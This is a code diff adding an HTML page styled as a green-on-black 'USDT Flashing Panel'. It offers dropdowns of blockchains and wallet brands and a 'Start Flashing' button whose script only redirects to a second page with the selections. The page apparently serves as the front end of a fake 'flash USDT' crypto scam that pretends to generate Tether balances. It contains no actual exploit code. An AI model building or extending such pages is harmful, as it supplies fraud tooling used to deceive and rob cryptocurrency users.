@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT Flashing Start</title>
+  <style>
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      margin: 0;
+      padding: 20px;
+    }
+    h1 {
+      text-align: center;
+      color: #0ff;
+      text-shadow: 0 0 10px #0ff;
+    }
+    .container {
+      max-width: 600px;
+      margin: auto;
+      padding: 20px;
+      background: rgba(0, 255, 0, 0.05);
+      border: 1px solid #0f0;
+      border-radius: 10px;
+      box-shadow: 0 0 15px #0f0;
+    }
+    label {
+      display: block;
+      margin-top: 20px;
+      font-weight: bold;
+      color: #0f0;
+    }
+    select, button {
+      width: 100%;
+      padding: 10px;
+      background: #111;
+      color: #0f0;
+      border: 1px solid #0f0;
+      border-radius: 5px;
+      font-size: 16px;
+      margin-top: 8px;
+    }
+    button {
+      margin-top: 25px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover {
+      background: #0f0;
+      color: #000;
+    }
+  </style>
+</head>
+<body>
+  <h1>USDT Flashing Panel</h1>
+  <div class="container">
+    <label for="network">Select Blockchain </label>
+    <select id="network">
+      <option value="">Select Network</option>
+      <option>TRC20</option>
+      <option>ERC20</option>
+      <option>BEP20</option>
+      <option>Polygon</option>
+      <option>Solana</option>
+      <option>Arbitrum</option>
+      <option>Optimism</option>
+      <option>Avalanche</option>
+      <option>Fantom</option>
+      <option>Cardano</option>
+    </select>
+
+    <label for="wallet">Select Wallet</label>
+    <select id="wallet">
+      <option value="">Select Wallet</option>
+      <option>Binance Wallet</option>
+      <option>Bitget Wallet</option>
+      <option>OKX Wallet</option>
+      <option>Bybit Wallet</option>
+      <option>MetaMask</option>
+      <option>Trust Wallet</option>
+      <option>Coinbase Wallet</option>
+      <option>Phantom Wallet</option>
+      <option>SafePal</option>
+      <option>TokenPocket</option>
+    </select>
+
+    <button onclick="startFlashing()">Start Flashing</button>
+  </div>
+
+  <script>
+    function startFlashing() {
+      const network = document.getElementById("network").value;
+      const wallet = document.getElementById("wallet").value;
+
+      if (!network || !wallet) {
+        alert("Please select both Network and Wallet.");
+        return;
+      }
+
+      const url = `usdt2.html?network=${encodeURIComponent(network)}&wallet=${encodeURIComponent(wallet)}`;
+      window.location.href = url;
+    }
+  </script>
+</body>
+</html>
